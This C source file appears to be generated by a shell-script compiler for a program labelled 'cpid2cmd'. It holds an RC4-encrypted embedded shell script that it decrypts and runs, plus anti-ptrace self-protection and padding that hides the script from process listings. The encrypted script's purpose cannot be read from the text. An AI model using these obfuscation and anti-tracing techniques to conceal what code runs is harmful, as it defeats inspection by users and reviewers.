/*
 * cpid2cmd
 * Copyright (C) 2013 Josh Max
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 */

static long date = 0;
static  int  relax = 0;
typedef char pswd_t[451];
static  char pswd[] = 
	"\054\162\373\215\032\224\141\246\203\131\005\241\375\042\170\216"
	"\226\007\065\302\014\371\370\105\010\045\020\110\010\122\014\064"
	"\304\007\302\337\234\043\205\037\175\213\300\172\255\071\010\103"
	"\100\075\005\115\067\376\222\077\043\242\210\054\364\224\140\271"
	"\233\042\230\067\106\035\127\303\250\027\075\125\120\105\230\221"
	"\202\236\336\271\234\160\371\277\022\201\353\007\025\114\300\260"
	"\156\130\350\264\165\077\167\036\126\264\163\247\371\014\070\174"
	"\252\026\065\106\206\056\005\230\257\361\237\304\075\137\165\253"
	"\267\135\140\055\234\327\113\362\214\276\231\205\312\321\001\164"
	"\347\067\272\155\145\300\006\025\261\245\331\356\005\116\231\274"
	"\253\371\351\107\321\064\072\135\363\323\342\275\245\344\062\214"
	"\033\354\372\200\254\000\225\135\245\157\113\252\275\345\147\151"
	"\336\120\260\257\205\352\014\170\276\357\065\143\323\147\357\356"
	"\124\351\156\000\351\004\136\217\163\251\071\060\216\240\231\155"
	"\361\112\034\166\064\051\356\362\030\043\125\353\213\105\331\337"
	"\056\107\337\030\113\075\247\276\347\340\357\165\201\210\342\162"
	"\322\377\350\007\050\326\371\100\371\117\053\204\224\004\143\302"
	"\113\103\332\227\200\201\125\147\142\104\335\343\315\277\125\237"
	"\276\075\246\346\023\240\046\014\357\121\221\203\125\364\105\241"
	"\067\040\070\270\241\215\037\003\322\374\346\237\274\073\076\172"
	"\170\345\141\213\205\207\230\164\331\051\367\056\035\074\317\125"
	"\134\007\015\376\225\054\001\147\051\350\006\345\043\104\137\234"
	"\051\300\047\256\110\277\042\041\350\031\117\006\126\037\133\262"
	"\046\150\260\273\224\262\042\275\232\050\242\275\155\002\131\226"
	"\302\201\105\012\100\147\053\051\201\173\057\327\232\212\211\300"
	"\362\072\174\206\354\236\104\206\307\346\103\064\350\235\312\253"
	"\036\017\265\136\167\341\207\370\134\266\317\366\100\130\266\062"
	"\222\062\271\176\321\375\004\230\343\110\314\314\345\226\167\003"
	"\246\054\141\015\351\025\151\237\344\137\340\074\026\022\317\110";
typedef char shll_t[10];
static  char shll[] = 
	"\137\247\364\145\375\161\212\133\157\357\115\031\310\122\261\254"
	"\232\175\170\177\024";
typedef char inlo_t[3];
static  char inlo[] = 
	"\355\242\063\202\272\033\343\327\051\314\354\222\154\320\362\114"
	"\014\010";
typedef char xecc_t[13];
static  char xecc[] = 
	"\340\207\206\223\205\275\003\120\070\263\240\012\366\333\120\052"
	"\051\152\362\173\033\236\025\231\026\224\255";
typedef char lsto_t[3];
static  char lsto[] = 
	"\036\252\200\026\147\041\371\076";
#define TEXT_chk1	"Francisco"
typedef char chk1_t[10];
static  char chk1[] = 
	"\032\326\215\326\002\051\337\075\335\073\306\052\334\062\372\316"
	"\176\006\326\334";
typedef char opts_t[1];
static  char opts[] = 
	"\034\047\006";
typedef char text_t[1491];
static  char text[] = 
	"\363\176\032\100\200\125\227\342\033\015\202\034\255\344\170\264"
	"\115\232\101\302\372\041\134\226\011\243\235\263\004\147\024\111"
	"\161\276\240\375\114\143\275\056\040\124\336\257\001\277\277\344"
	"\160\076\216\054\134\244\261\070\022\237\321\203\121\075\015\247"
	"\322\203\015\055\040\151\124\230\336\354\033\041\047\233\066\205"
	"\222\312\204\236\006\035\052\321\374\216\246\217\003\170\131\314"
	"\121\013\125\162\246\002\334\037\212\213\220\340\072\123\074\105"
	"\102\006\273\236\007\021\302\341\125\323\270\344\362\276\353\352"
	"\222\074\370\077\122\314\331\341\247\325\163\212\156\373\040\122"
	"\122\305\353\122\312\015\031\055\140\375\070\324\051\000\066\037"
	"\301\137\076\102\303\037\312\372\113\273\170\245\130\142\267\367"
	"\362\250\165\020\356\032\177\360\335\200\141\301\010\023\030\363"
	"\276\016\277\206\204\060\137\251\146\317\124\330\261\021\041\251"
	"\235\024\241\110\115\042\361\330\164\103\123\042\240\342\167\373"
	"\033\172\001\277\044\267\103\157\251\275\143\352\235\052\302\011"
	"\342\105\211\214\005\370\132\264\016\125\224\043\202\227\375\251"
	"\066\011\070\355\173\220\133\070\343\347\205\047\225\344\367\172"
	"\223\333\250\371\255\026\032\227\326\042\353\004\012\376\015\316"
	"\207\366\306\067\275\040\024\016\006\107\035\046\347\144\023\076"
	"\126\332\304\321\340\040\225\123\264\165\304\112\005\346\347\137"
	"\054\111\310\135\051\054\375\273\165\203\175\207\012\233\174\371"
	"\125\007\237\224\047\044\076\040\376\344\274\304\365\333\315\317"
	"\377\075\375\022\263\316\374\260\003\171\351\211\057\060\052\066"
	"\361\127\121\012\165\252\160\072\231\007\117\207\354\112\246\035"
	"\310\227\330\201\342\117\042\063\247\252\053\022\345\224\043\213"
	"\371\341\154\215\046\334\111\201\106\165\321\020\366\004\051\064"
	"\022\266\211\021\201\202\312\326\042\061\355\165\161\356\174\156"
	"\341\002\145\231\221\357\322\367\270\056\125\025\306\122\005\165"
	"\046\144\302\362\067\374\234\157\256\230\042\046\104\335\116\347"
	"\363\025\062\223\273\260\127\046\172\347\014\330\230\154\246\267"
	"\331\314\145\136\134\021\327\107\363\210\062\205\142\224\110\054"
	"\142\241\067\224\344\124\257\310\354\267\176\323\032\123\357\106"
	"\043\263\034\020\102\257\026\274\367\240\176\152\326\216\335\332"
	"\357\235\374\253\044\016\360\137\356\126\354\221\075\056\370\056"
	"\150\112\111\364\364\224\142\111\226\047\003\226\322\114\134\217"
	"\232\140\244\231\005\171\116\205\224\254\233\345\300\074\061\333"
	"\051\361\077\017\175\065\214\301\324\145\026\261\235\034\357\007"
	"\267\173\143\110\245\001\330\274\357\132\103\037\054\374\067\331"
	"\107\312\167\064\114\042\353\016\274\212\352\156\236\310\310\350"
	"\240\046\213\246\273\337\130\104\274\140\372\160\066\027\155\065"
	"\111\316\172\205\276\376\346\026\201\010\204\337\370\365\060\041"
	"\231\201\044\137\073\213\331\355\013\376\306\136\360\263\126\215"
	"\210\344\346\143\303\023\235\150\223\300\055\064\100\303\233\022"
	"\253\213\372\107\377\034\236\221\150\103\124\345\354\150\004\105"
	"\077\161\302\360\130\175\374\030\374\066\371\213\011\317\033\361"
	"\102\264\273\271\017\054\300\044\376\145\041\033\064\257\307\151"
	"\122\222\301\211\111\071\067\107\105\157\032\366\302\122\141\142"
	"\256\173\252\261\256\052\040\101\126\024\040\023\234\354\244\151"
	"\213\105\110\337\040\176\235\045\323\234\107\206\007\044\337\367"
	"\060\352\061\135\371\026\032\145\235\062\050\307\073\074\374\266"
	"\100\244\116\006\254\276\343\204\071\342\262\264\376\233\074\364"
	"\025\042\210\204\351\273\220\010\103\061\051\274\172\154\103\104"
	"\112\040\002\046\260\027\274\151\375\207\253\373\263\011\135\145"
	"\344\212\156\125\030\266\347\337\272\320\171\150\175\130\070\050"
	"\202\300\107\345\063\330\054\362\072\027\232\112\232\226\012\172"
	"\200\117\347\263\261\237\103\274\147\356\175\154\001\307\242\036"
	"\164\366\127\060\040\207\257\060\261\225\105\241\006\371\203\172"
	"\260\204\021\340\321\210\346\052\030\343\131\350\325\263\351\113"
	"\174\302\372\107\152\337\142\340\307\144\227\321\341\172\331\071"
	"\172\045\153\044\243\041\217\367\026\121\114\020\006\112\021\026"
	"\104\223\324\222\050\136\072\141\265\341\101\062\041\276\211\114"
	"\042\046\156\314\006\331\174\262\346\304\001\236\316\117\221\144"
	"\300\162\326\213\244\151\035\130\042\370\322\116\140\101\175\237"
	"\120\303\220\002\372\260\237\361\331\034\246\062\322\327\156\150"
	"\146\324\332\202\102\072\305\257\217\251\013\026\371\237\170\241"
	"\260\240\201\064\322\305\334\146\105\120\156\126\175\107\142\325"
	"\241\244\250\157\152\247\352\342\332\232\316\067\235\316\105\264"
	"\165\156\065\374\263\211\247\225\115\371\227\236\353\166\216\227"
	"\017\336\166\263\354\040\207\034\311\165\070\341\214\254\060\217"
	"\373\360\262\217\173\240\340\111\263\056\334\175\076\136\152\300"
	"\044\305\060\101\273\274\166\261\315\174\372\106\345\075\350\003"
	"\340\030\116\376\117\247\133\161\320\102\143\251\034\224\301\047"
	"\330\322\055\026\376\010\315\075\322\371\124\347\023\210\050\160"
	"\172\260\144\133\107\064\344\303\355\164\153\044\027\256\203\131"
	"\011\077\047\013\343\335\153\117\012\356\072\362\117\345\254\134"
	"\162\337\327\140\075\377\100\371\015\023\015\270\157\322\171\045"
	"\247\162\232\007\037\123\232\332\064\066\012\152\054\262\154\321"
	"\316\054\240\205\114\163\307\070\014\266\252\036\140\106\334\126"
	"\356\254\341\060\200\174\300\174\223\371\137\275\115\330\165\132"
	"\155\343\100\007\164\040\233\327\024\346\100\142\355\323\204\244"
	"\071\364\120\270\220\350\244\223\113\366\073\164\047\171\201\177"
	"\053\131\371\225\320\143\315\325\154\355\065\115\255\036\237\076"
	"\152\261\364\307\223\177\034\030\034\320\072\165\070\065\233\233"
	"\005\240\275\022\334\136\070\337\220\222\131\004\267\233\043\073"
	"\204\176\321\247\236\020\144\120\257\256\065\045\261\304\062\266"
	"\344\005\365\164\367\044\144\123\036\360\373\040\257\222\025\265"
	"\262\025\242\366\003\367\054\361\373\173\316\163\037\002\156\255"
	"\367\205\212\224\350\121\320\337\251\016\355\120\023\223\174\121"
	"\330\120\314\041\326\374\061\135\254\271\147\022\210\124\150\137"
	"\151\175\005\330\042\030\011\176\074\165\302\134\254\020\327\010"
	"\024\003\033\244\251\315\314\251\270\146\306\270\030\014\153\356"
	"\171\232\360\301\272\344\222\226\232\136\113\123\076\147\362\015"
	"\030\134\060\046\373\376\356\115\021\302\354\262\050\152\331\013"
	"\153\367\142\221\371\206\254\227\233\105\256\057\362\263";
#define TEXT_chk2	"Rosales"
typedef char chk2_t[8];
static  char chk2[] = 
	"\062\047\054\070\005\253\327\155\131\324\076\227\036";
typedef char hide_t[4096];
/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/**
 * 'Alleged RC4' Source Code picked up from the news.
 * From: allen@gateway.grumman.com (John L. Allen)
 * Newsgroups: comp.lang.c
 * Subject: Shrink this C code for fame and fun
 * Date: 21 May 1996 10:49:37 -0400
 */

static unsigned char state[256], * ptr, indx, jndx, tmp;

/*
 * Reset rc4 state. 
 */
void state_0(void)
{
	indx = jndx = 0;
	do {
		state[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(char * str, int len)
{
	ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = state[indx];
			jndx += tmp;
			jndx += ptr[(int)indx % len];
			state[indx] = state[jndx];
			state[jndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void rc4(char * str, int len)
{
	ptr = (unsigned char *)str;
	jndx = 0;
	while (len > 0) {
		indx++;
		tmp = state[indx];
		jndx += tmp;
		state[indx] = state[jndx];
		state[jndx] = tmp;
		tmp += state[indx];
		*ptr ^= state[tmp];
		ptr++;
		len--;
	}
}

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key((char *)control, sizeof(control));
	return 0;
}

#ifdef DEBUGEXEC
#define DEBUGEXEC	/* Define if you want to debug execvp calls */

void debugexec(char * shll, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", shll ? shll : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}

#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned)chkenv;
	mask ^= (unsigned)getpid() * ~mask;
	sprintf(buff, "x%x", mask);
	string = getenv(buff);
#ifdef DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%u %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%u %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#define UNTRACEABLE	/* Define to prevent ptrace this executable */
#ifdef UNTRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = vfork()) {
	case 0:
		pid = getppid();
		/* For problematic SunOS ptrace */
		sprintf(proc, "/proc/%d/as", (int)pid);
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			fprintf(stderr, "%s: Being traced!\n", argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif	/* UNTRACEABLE */

char * xsh(int argc, char ** argv)
{
	char buff[512];
	char * scrpt;
	int ret, i, j;
	char ** varg;

	state_0();
	key(pswd, sizeof(pswd_t));
	rc4(shll, sizeof(shll_t));
	rc4(inlo, sizeof(inlo_t));
	rc4(xecc, sizeof(xecc_t));
	rc4(lsto, sizeof(lsto_t));
	rc4(chk1, sizeof(chk1_t));
	if (strcmp(TEXT_chk1, chk1))
		return "I have changed!";
	ret = chkenv(argc);
	if (ret < 0)
		return "Unnormal behavior!";
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		if (!relax && key_with_file(shll))
			return shll;
		rc4(opts, sizeof(opts_t));
		rc4(text, sizeof(text_t));
		rc4(chk2, sizeof(chk2_t));
		if (strcmp(TEXT_chk2, chk2))
			return "Shell have changed!";
		if (sizeof(text_t) < sizeof(hide_t)) {
			/* Prepend spaces til a sizeof(hide_t) script size. */
			scrpt = malloc(sizeof(hide_t));
			if (!scrpt)
				return 0;
			memset(scrpt, (int) ' ', sizeof(hide_t));
			memcpy(&scrpt[sizeof(hide_t) - sizeof(text_t)], text, sizeof(text_t));
		} else {
			scrpt = text;	/* Script text */
		}
	} else {			/* Reexecute */
		if (*xecc) {
			sprintf(buff, xecc, argv[0]);
			scrpt = buff;
		} else {
			scrpt = argv[0];
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#ifdef DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#ifdef DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#ifdef UNTRACEABLE
	untraceable(argv[0]);
#endif
	if (date && (date < (long)time(NULL))) {
		fprintf(stderr, "%s: Out of date\n", argv[0]);
	} else {
		argv[1] = xsh(argc, argv);
		fprintf(stderr, "%s%s%s: %s\n", argv[0],
			errno ? ": " : "",
			errno ? strerror(errno) : "",
			argv[1] ? argv[1] : "<null>"
		);
	}
	return 1;
}
